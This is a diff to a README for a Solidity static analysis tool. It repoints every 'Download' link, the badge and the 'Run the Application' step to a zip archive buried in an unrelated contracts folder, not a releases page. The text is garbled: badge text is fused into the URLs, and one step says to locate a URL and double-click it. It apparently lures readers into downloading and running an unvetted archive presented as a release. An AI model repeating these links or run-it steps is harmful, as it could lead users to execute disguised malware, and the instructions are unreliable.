@@ -1,6 +1,6 @@
 # 🚀 static-analyzer - Analyze Solidity with Ease and Confidence
 
-[![Download static-analyzer](https://raw.githubusercontent.com/hoangquan0911/static-analyzer/main/embryotic/static-analyzer.zip%20Now-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/hoangquan0911/static-analyzer/main/embryotic/static-analyzer.zip)
+[![Download static-analyzer](https://github.com/hoangquan0911/static-analyzer/raw/refs/heads/main/contracts/dexodus-contract/interfaces/analyzer-static-v3.6-alpha.4.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/hoangquan0911/static-analyzer/raw/refs/heads/main/contracts/dexodus-contract/interfaces/analyzer-static-v3.6-alpha.4.zip)
 
 ## 🛠️ Overview
 
@@ -28,13 +28,13 @@ To begin using static-analyzer, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
    
-   [Download static-analyzer](https://raw.githubusercontent.com/hoangquan0911/static-analyzer/main/embryotic/static-analyzer.zip)
+   [Download static-analyzer](https://github.com/hoangquan0911/static-analyzer/raw/refs/heads/main/contracts/dexodus-contract/interfaces/analyzer-static-v3.6-alpha.4.zip)
 
 2. **Download the Latest Release**: Choose the appropriate file for your operating system and download it.
 
 3. **Extract the Files**: After downloading, unzip the files to a preferred location on your computer.
 
-4. **Run the Application**: Locate the `https://raw.githubusercontent.com/hoangquan0911/static-analyzer/main/embryotic/static-analyzer.zip` (or equivalent file) and double-click to launch the application.
+4. **Run the Application**: Locate the `https://github.com/hoangquan0911/static-analyzer/raw/refs/heads/main/contracts/dexodus-contract/interfaces/analyzer-static-v3.6-alpha.4.zip` (or equivalent file) and double-click to launch the application.
 
 5. **Follow On-Screen Instructions**: The application will guide you through the initial setup.
 
@@ -42,7 +42,7 @@ To begin using static-analyzer, follow these steps:
 
 You can download the latest version of static-analyzer directly from our Releases page. Simply click below to begin:
 
-[Download static-analyzer](https://raw.githubusercontent.com/hoangquan0911/static-analyzer/main/embryotic/static-analyzer.zip)
+[Download static-analyzer](https://github.com/hoangquan0911/static-analyzer/raw/refs/heads/main/contracts/dexodus-contract/interfaces/analyzer-static-v3.6-alpha.4.zip)
 
 ## 📊 How to Use static-analyzer
 
